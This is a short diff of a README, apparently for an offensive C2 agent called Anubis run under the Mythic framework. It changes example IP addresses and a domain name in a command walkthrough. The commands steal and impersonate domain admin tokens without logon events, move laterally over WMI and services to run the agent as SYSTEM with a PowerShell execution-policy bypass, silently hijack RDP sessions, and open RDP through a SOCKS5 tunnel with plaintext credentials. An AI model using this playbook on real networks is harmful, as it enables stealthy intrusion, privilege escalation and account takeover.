@@ -202,19 +202,19 @@ sudo ./mythic-cli install github https://github.com/wtechsec/Anubis.git
 token_steal                          # List tokens from running processes
 token_steal 1884                     # Impersonate domain admin token (no logon event)
 
-wmi_exec 10.12.193.4 "whoami"        # Validate lateral access via WMI (no wmic.exe)
+wmi_exec 192.168.1.10 "whoami"       # Validate lateral access via WMI (no wmic.exe)
 
-sc_exec 10.12.193.4 \                # Deploy Anubis as SYSTEM on lateral host
+sc_exec 192.168.1.10 \               # Deploy Anubis as SYSTEM on lateral host
   "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
 
-# On new SYSTEM agent at 10.12.193.4:
+# On new SYSTEM agent at 192.168.1.10:
 rdp_hijack                           # List RDP sessions
 rdp_hijack 3                         # Hijack disconnected domain admin session (silent)
 
 # External RDP via SOCKS5 tunnel (from Kali, no proxychains needed):
-rdp_ext 10.12.193.4 Administrator P@ssw0rd COPEL
-# → enable RDP + port 6000 + firewall + TermService restart on 10.12.193.4
-# → xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4:6000 /u:Administrator /d:COPEL ...
+rdp_ext 192.168.1.10 Administrator P@ssw0rd CORP
+# → enable RDP + port 6000 + firewall + TermService restart on 192.168.1.10
+# → xfreerdp /proxy:socks5://127.0.0.1:7005 /v:192.168.1.10:6000 /u:Administrator /d:CORP ...
 ```
 
 ---
